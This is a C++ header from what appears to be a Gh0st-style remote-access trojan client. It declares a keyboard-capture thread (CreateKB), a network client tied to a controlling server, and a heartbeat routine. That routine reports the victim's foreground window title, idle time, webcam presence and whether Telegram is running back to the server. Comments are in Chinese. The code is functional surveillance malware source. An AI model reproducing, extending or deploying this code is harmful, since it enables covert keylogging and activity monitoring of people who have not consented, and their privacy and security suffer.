// KernelManager.h: interface for the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_KERNELMANAGER_H__B1186DC0_E4D7_4D1A_A8B8_08A01B87B89E__INCLUDED_)
#define AFX_KERNELMANAGER_H__B1186DC0_E4D7_4D1A_A8B8_08A01B87B89E__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include <vector>

#define MAX_THREADNUM 0x1000>>2

#include <iostream>
#include <string>
#include <iomanip>
#include <TlHelp32.h>
#include "LoginServer.h"

// 根据配置决定采用什么通讯协议
IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, bool exit_while_disconnect = false);

ThreadInfo* CreateKB(CONNECT_ADDRESS* conn, State& bExit);

class ActivityWindow {
public:
	std::string Check(DWORD threshold_ms = 6000) {
		auto idle = GetUserIdleTime();
		BOOL isActive = (idle < threshold_ms);
		if (isActive) {
			return GetActiveWindowTitle();
		}
		return "Inactive: " + FormatMilliseconds(idle);
	}

private:
	std::string FormatMilliseconds(DWORD ms)
	{
		DWORD totalSeconds = ms / 1000;
		DWORD hours = totalSeconds / 3600;
		DWORD minutes = (totalSeconds % 3600) / 60;
		DWORD seconds = totalSeconds % 60;

		std::stringstream ss;
		ss << std::setfill('0')
			<< std::setw(2) << hours << ":"
			<< std::setw(2) << minutes << ":"
			<< std::setw(2) << seconds;

		return ss.str();
	}

	std::string GetActiveWindowTitle()
	{
		HWND hForegroundWindow = GetForegroundWindow();
		if (hForegroundWindow == NULL)
			return "No active window";

		char windowTitle[256];
		GetWindowTextA(hForegroundWindow, windowTitle, sizeof(windowTitle));
		return std::string(windowTitle);
	}

	DWORD GetLastInputTime()
	{
		LASTINPUTINFO lii = { sizeof(LASTINPUTINFO) };
		GetLastInputInfo(&lii);
		return lii.dwTime;
	}

	DWORD GetUserIdleTime()
	{
		return (GetTickCount64() - GetLastInputTime());
	}
};

class CKernelManager : public CManager  
{
public:
	CONNECT_ADDRESS* m_conn;
	HINSTANCE m_hInstance;
	CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, HINSTANCE hInstance, ThreadInfo* kb);
	virtual ~CKernelManager();
	VOID OnReceive(PBYTE szBuffer, ULONG ulLength);
	ThreadInfo* m_hKeyboard;
	ThreadInfo  m_hThread[MAX_THREADNUM];
	// 此值在原代码中是用于记录线程数量；当线程数量超出限制时m_hThread会越界而导致程序异常
	// 因此我将此值的含义修改为"可用线程下标"，代表数组m_hThread中所指位置可用，即创建新的线程放置在该位置
	ULONG   m_ulThreadCount;
	UINT	GetAvailableIndex();

	MasterSettings m_settings;
	int m_nNetPing; // 网络状况
	// 发送心跳
	int SendHeartbeat() {
		for (int i = 0; i < m_settings.ReportInterval && !g_bExit && m_ClientObject->IsConnected(); ++i)
			Sleep(1000);
		if (m_settings.ReportInterval <= 0) { // 关闭上报信息（含心跳）
			Sleep(1000);
			return 0;
		}
		if (g_bExit || !m_ClientObject->IsConnected())
			return -1;

		ActivityWindow checker;
		auto s = checker.Check();
		Heartbeat a(s, m_nNetPing);

		a.HasSoftware = SoftwareCheck(m_settings.DetectSoftware);

		BYTE buf[sizeof(Heartbeat) + 1];
		buf[0] = TOKEN_HEARTBEAT;
		memcpy(buf + 1, &a, sizeof(Heartbeat));
		m_ClientObject->Send2Server((char*)buf, sizeof(buf));
		return 0;
	}
	bool SoftwareCheck(int type) {
		static std::map<int, std::string> m = {
			{SOFTWARE_CAMERA, "摄像头"},
			{SOFTWARE_TELEGRAM, "telegram.exe" },
		};
		static bool hasCamera = WebCamIsExist();
		return type == SOFTWARE_CAMERA ? hasCamera : IsProcessRunning({ m[type] });
	}
	// 检查进程是否正在运行
	bool IsProcessRunning(const std::vector<std::string>& processNames) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);

		// 获取当前系统中所有进程的快照
		HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hProcessSnap == INVALID_HANDLE_VALUE)
			return true;

		// 遍历所有进程
		if (Process32First(hProcessSnap, &pe32)) {
			do {
				for (const auto& processName : processNames) {
					// 如果进程名称匹配，则返回 true
					if (_stricmp(pe32.szExeFile, processName.c_str()) == 0) {
						CloseHandle(hProcessSnap);
						return true;
					}
				}
			} while (Process32Next(hProcessSnap, &pe32));
		}

		CloseHandle(hProcessSnap);
		return false;
	}
};

#endif // !defined(AFX_KERNELMANAGER_H__B1186DC0_E4D7_4D1A_A8B8_08A01B87B89E__INCLUDED_)
